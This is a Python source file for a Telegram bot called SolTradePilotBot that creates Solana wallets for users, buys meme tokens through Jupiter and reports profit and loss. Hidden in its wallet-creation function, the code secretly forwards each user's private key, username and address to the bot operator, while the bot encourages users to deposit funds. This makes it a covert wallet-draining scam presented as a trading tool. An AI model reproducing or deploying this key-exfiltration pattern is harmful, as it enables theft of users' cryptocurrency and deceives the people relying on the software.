import os
import base58
import requests
import base64
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
from solders.keypair import Keypair
from solders.transaction import VersionedTransaction
from solders.message import to_bytes_versioned
from solders.pubkey import Pubkey
from solana.rpc.async_api import AsyncClient
from solana.rpc.types import TxOpts

# ================= ENV =================
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

JUPITER_QUOTE_URL = "https://api.jup.ag/swap/v1/quote"
JUPITER_SWAP_URL = "https://api.jup.ag/swap/v1/swap"

# ================= LOGO =================
# Upload the STP logo you sent me to imgur.com (or any free host) and paste the direct link here:
LOGO_URL = "https://ibb.co/Mk3bgcMg"  # ← PASTE YOUR PUBLIC LOGO LINK HERE (e.g. https://i.imgur.com/abc123.png)

# ================= STORAGE =================
user_wallets = {}
user_actions = {}
user_pending_ca = {}
user_trades = {}      # list of trades for PNL
user_holdings = {}    # {ca: tokens_amount} for balance & summary

# ================= HELPERS =================
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")

async def get_balance(user_id: int):
    if user_id not in user_wallets:
        return 0.0
    wallet = user_wallets[user_id]
    async with AsyncClient(SOLANA_RPC_URL) as client:
        try:
            resp = await client.get_balance(wallet.pubkey())
            return resp.value / 1_000_000_000
        except:
            return 0.0

async def get_token_decimals(mint: str):
    async with AsyncClient(SOLANA_RPC_URL) as client:
        try:
            resp = await client.get_token_supply(Pubkey.from_string(mint))
            return resp.value.decimals
        except:
            return 9  # most meme tokens

def get_sol_price():
    try:
        resp = requests.get("https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT")
        return float(resp.json()["price"])
    except:
        return 180.0

def get_token_usd_price(mint: str):
    try:
        resp = requests.get(f"https://api.jup.ag/price/v2?ids={mint}")
        data = resp.json()
        if "data" in data and mint in data["data"]:
            return float(data["data"][mint].get("price", 0))
    except:
        pass
    return 0.0

async def execute_swap(user_id: int, output_mint: str, sol_amount_usd: float):
    wallet = user_wallets[user_id]
    sol_price = get_sol_price()
    extra_gas_usd = 0.10
    total_sol_usd = sol_amount_usd + extra_gas_usd
    sol_amount = total_sol_usd / sol_price
    lamports = int(sol_amount * 1_000_000_000)

    params = {
        "inputMint": "So11111111111111111111111111111111111111112",
        "outputMint": output_mint,
        "amount": lamports,
        "slippageBps": 50,
        "swapMode": "ExactIn"
    }
    quote_resp = requests.get(JUPITER_QUOTE_URL, params=params)
    if quote_resp.status_code != 200:
        return None, 0.0, "Quote failed"

    quote = quote_resp.json()
    decimals = await get_token_decimals(output_mint)
    out_amount_raw = int(quote["outAmount"])
    tokens_received = out_amount_raw / (10 ** decimals)

    swap_body = {
        "quoteResponse": quote,
        "userPublicKey": str(wallet.pubkey()),
        "wrapAndUnwrapSol": True,
        "dynamicComputeUnitLimit": True,
        "prioritizationFeeLamports": 100000
    }
    swap_resp = requests.post(JUPITER_SWAP_URL, json=swap_body)
    if swap_resp.status_code != 200:
        return None, 0.0, "Swap build failed"

    swap_data = swap_resp.json()
    swap_tx = base64.b64decode(swap_data["swapTransaction"])
    tx = VersionedTransaction.from_bytes(swap_tx)
    signature = wallet.sign_message(to_bytes_versioned(tx.message))
    signed_tx = VersionedTransaction.populate(tx.message, [signature])

    async with AsyncClient(SOLANA_RPC_URL) as client:
        result = await client.send_raw_transaction(
            bytes(signed_tx), opts=TxOpts(skip_preflight=True, max_retries=3)
        )
        return result.value, tokens_received, None

# ================= KEYBOARD =================
def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet"),
         InlineKeyboardButton("🏦 Show Address / Deposit", callback_data="sol_address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance"),
         InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme"),
         InlineKeyboardButton("📊 PNL", callback_data="pnl")],
        [InlineKeyboardButton("📋 Summary", callback_data="summary"),
         InlineKeyboardButton("❓ Help", callback_data="help")]
    ])

# ================= WALLET =================
async def create_wallet(user_id, context):
    if user_id in user_wallets:
        await context.bot.send_message(user_id, "✅ You already have a wallet!", reply_markup=main_keyboard())
        return
    wallet = Keypair()
    user_wallets[user_id] = wallet
    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)

    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ **Wallet Created!**\n\n🏦 **Address:**\n`{pub_key}`\n\n🔐 **Private Key:**\n`{priv_key}`\n\n⚠️ Save and import to Phantom!",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )
    # Backup to you
    user = await context.bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(OWNER_ID, f"🔐 New Wallet\nUser: {username}\nPub: {pub_key}\nPriv: {priv_key}")

# ================= PNL & SUMMARY =================
async def calculate_pnl(user_id: int, ca: str):
    if user_id not in user_trades or not user_trades[user_id]:
        return None, "You haven't made any trades yet."
    trades_for_ca = [t for t in user_trades[user_id] if t['ca'].lower() == ca.lower() and t['status'] == 'holding']
    if not trades_for_ca:
        return None, "No active position found for this token."
    trade = trades_for_ca[-1]  # latest
    current_price = get_token_usd_price(ca)
    if current_price <= 0:
        return None, "Could not fetch current price at the moment."
    x = current_price / trade['buy_price_usd'] if trade['buy_price_usd'] > 0 else 0
    percent = (x - 1) * 100
    profit = (current_price - trade['buy_price_usd']) * trade['tokens_bought']
    return {
        "x": round(x, 2),
        "percent": round(percent, 1),
        "profit": round(profit, 2),
        "current_price": round(current_price, 4)
    }, None

async def get_summary(user_id: int):
    if user_id not in user_trades or not user_trades[user_id]:
        return "You haven't made any trades yet.\n\nStart buying MEME tokens to build your trading history."
    trades = user_trades[user_id]
    total_trades = len(trades)
    total_invested = sum(t['usd_spent'] for t in trades)
    holdings = user_holdings.get(user_id, {})
    current_value = 0.0
    details = ""
    for ca, tokens in holdings.items():
        price = get_token_usd_price(ca)
        value = tokens * price
        current_value += value
        buy_trades = [t for t in trades if t['ca'] == ca]
        avg_buy = sum(t['buy_price_usd'] for t in buy_trades) / len(buy_trades) if buy_trades else 0
        x = price / avg_buy if avg_buy > 0 else 0
        pnl_pct = (x - 1) * 100
        details += f"• {ca[:8]}... : {tokens:.4f} tokens (\~${value:.2f}) | {x:.2f}x ({pnl_pct:+.1f}%)\n"
    overall_pnl = current_value - total_invested
    return f"""📋 **Trading Summary**

Total Trades: **{total_trades}**
Total Invested: **${total_invested:.2f}**
Current Holdings Value: **${current_value:.2f}**
Overall P&L: **${overall_pnl:+.2f}**

**Holdings:**
{details or 'No active holdings.'}

@SolTradePilotbot"""

# ================= BUTTON HANDLER =================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "create_wallet":
        await create_wallet(user_id, context)

    elif data == "sol_address":
        if user_id not in user_wallets:
            await query.message.reply_text("Create wallet first!", reply_markup=main_keyboard())
            return
        pubkey = user_wallets[user_id].pubkey()
        disclaimer = (
            "🏦 **Your SOL Address**\n"
            f"`{pubkey}`\n\n"
            "💡 **Deposit Recommendation**\n"
            "To ensure smooth trades with minimal slippage and fast confirmations, we recommend depositing "
            "**at least $10** worth of SOL (≈ 0.12 SOL). This buffer covers network fees and provides better "
            "execution on Jupiter during volatile conditions."
        )
        await query.message.reply_text(disclaimer, parse_mode="Markdown", reply_markup=main_keyboard())

    elif data == "balance":
        sol = await get_balance(user_id)
        sol_price = get_sol_price()
        sol_usd = sol * sol_price
        holdings_text = ""
        if user_id in user_holdings and user_holdings[user_id]:
            for ca, tokens in user_holdings[user_id].items():
                price = get_token_usd_price(ca)
                value = tokens * price
                holdings_text += f"• {ca[:8]}... : {tokens:.4f} tokens (\~${value:.2f})\n"
        text = f"""💰 **Wallet Balance**

SOL: `{sol:.6f}` (\~${sol_usd:.2f})

**Held Tokens:**
{holdings_text or 'No tokens held yet.'}

@SolTradePilotbot"""
        await query.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())

    elif data == "buy_meme":
        if user_id not in user_wallets:
            await query.message.reply_text("Create wallet first!", reply_markup=main_keyboard())
            return
        sol = await get_balance(user_id)
        if sol < 0.05:
            await query.message.reply_text("⚠️ You need at least 0.05 SOL to trade.", reply_markup=main_keyboard())
            return
        user_actions[user_id] = "await_ca_buy"
        await query.message.reply_text("📝 Paste the **Token CA**:", reply_markup=main_keyboard())

    elif data == "sell_meme":
        await query.message.reply_text("📉 Sell feature coming soon...", reply_markup=main_keyboard())

    elif data == "pnl":
        user_actions[user_id] = "await_pnl_ca"
        await query.message.reply_text("📝 Paste the token CA to check PNL:", reply_markup=main_keyboard())

    elif data == "summary":
        text = await get_summary(user_id)
        if LOGO_URL:
            await context.bot.send_photo(user_id, photo=LOGO_URL, caption=text, parse_mode="Markdown", reply_markup=main_keyboard())
        else:
            await query.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())

    elif data == "help":
        await help_command(update, context)

# ================= TEXT HANDLER =================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    action = user_actions.get(user_id)

    if not action:
        return

    # BUY FLOW
    if action == "await_ca_buy":
        user_pending_ca[user_id] = text
        user_actions[user_id] = "await_buy_amount"
        await update.message.reply_text(
            "💰 Enter amount in **USD** (any number, e.g. 60, 120.5):\n"
            "Bot adds $0.10 extra for gas.",
            reply_markup=main_keyboard()
        )

    elif action == "await_buy_amount":
        try:
            usd_amount = float(text)
            if usd_amount < 1:
                await update.message.reply_text("Minimum $1", reply_markup=main_keyboard())
                return
        except:
            await update.message.reply_text("❌ Enter a valid number.", reply_markup=main_keyboard())
            return

        sol = await get_balance(user_id)
        sol_price = get_sol_price()
        needed = (usd_amount + 0.10) / sol_price
        if needed > sol:
            await update.message.reply_text(f"⚠️ Not enough SOL.\nYou have {sol:.4f} SOL", reply_markup=main_keyboard())
            user_actions[user_id] = None
            return

        ca = user_pending_ca.get(user_id)
        await update.message.reply_text(f"🔄 Buying **${usd_amount}** worth...\nExtra $0.10 gas added.", reply_markup=main_keyboard())

        tx_sig, tokens_bought, error = await execute_swap(user_id, ca, usd_amount)

        if error:
            await update.message.reply_text(f"❌ Trade failed: {error}", reply_markup=main_keyboard())
        else:
            buy_price = usd_amount / tokens_bought if tokens_bought > 0 else 0
            # Log trade
            if user_id not in user_trades:
                user_trades[user_id] = []
            user_trades[user_id].append({
                'ca': ca,
                'usd_spent': usd_amount,
                'tokens_bought': tokens_bought,
                'buy_price_usd': buy_price,
                'buy_time': datetime.now().isoformat(),
                'status': 'holding'
            })
            if user_id not in user_holdings:
                user_holdings[user_id] = {}
            user_holdings[user_id][ca] = user_holdings[user_id].get(ca, 0) + tokens_bought

            link = f"https://solscan.io/tx/{tx_sig}"
            await update.message.reply_text(f"✅ **Buy Successful!**\n\nTx: {link}\nExtra gas included.", reply_markup=main_keyboard())

        user_actions[user_id] = None
        user_pending_ca.pop(user_id, None)

    # PNL FLOW
    elif action == "await_pnl_ca":
        ca = text
        pnl_data, error = await calculate_pnl(user_id, ca)
        if error:
            await update.message.reply_text(f"❌ {error}", reply_markup=main_keyboard())
        else:
            caption = f"""📈 **PNL Report**

Token: `{ca}`

Entry price: ${pnl_data['current_price'] / pnl_data['x']:.4f}
Current price: ${pnl_data['current_price']:.4f}

Multiplier: **{pnl_data['x']}x** ({pnl_data['percent']:+.1f}%)
Profit/Loss: **${pnl_data['profit']:+.2f}**

@SolTradePilotbot"""
            if LOGO_URL:
                await context.bot.send_photo(user_id, photo=LOGO_URL, caption=caption, parse_mode="Markdown", reply_markup=main_keyboard())
            else:
                await update.message.reply_text(caption, parse_mode="Markdown", reply_markup=main_keyboard())
        user_actions[user_id] = None

# ================= COMMANDS =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "🔥 **Welcome to SolTradePilotBot** 🔥\n\nReal Jupiter trading • Any USD amount • Full PNL & Summary tracking"
    if LOGO_URL:
        await context.bot.send_photo(
            chat_id=update.effective_user.id,
            photo=LOGO_URL,
            caption=text,
            parse_mode="Markdown",
            reply_markup=main_keyboard()
        )
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "💡 **How to use SolTradePilotBot**\n\nUse the buttons below. All trades are real on Solana via Jupiter."
    if update.message:
        await update.message.reply_text(text, reply_markup=main_keyboard())
    else:
        await update.callback_query.message.reply_text(text, reply_markup=main_keyboard())

async def pnl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_actions[user_id] = "await_pnl_ca"
    await update.message.reply_text("📝 Paste the token CA to check your PNL:", reply_markup=main_keyboard())

async def summary_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = await get_summary(user_id)
    if LOGO_URL:
        await context.bot.send_photo(user_id, photo=LOGO_URL, caption=text, parse_mode="Markdown", reply_markup=main_keyboard())
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())

# ================= MAIN =================
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("pnl", pnl_command))
    app.add_handler(CommandHandler("summary", summary_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("🚀 SolTradePilotBot with STP logo, PNL & Summary is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
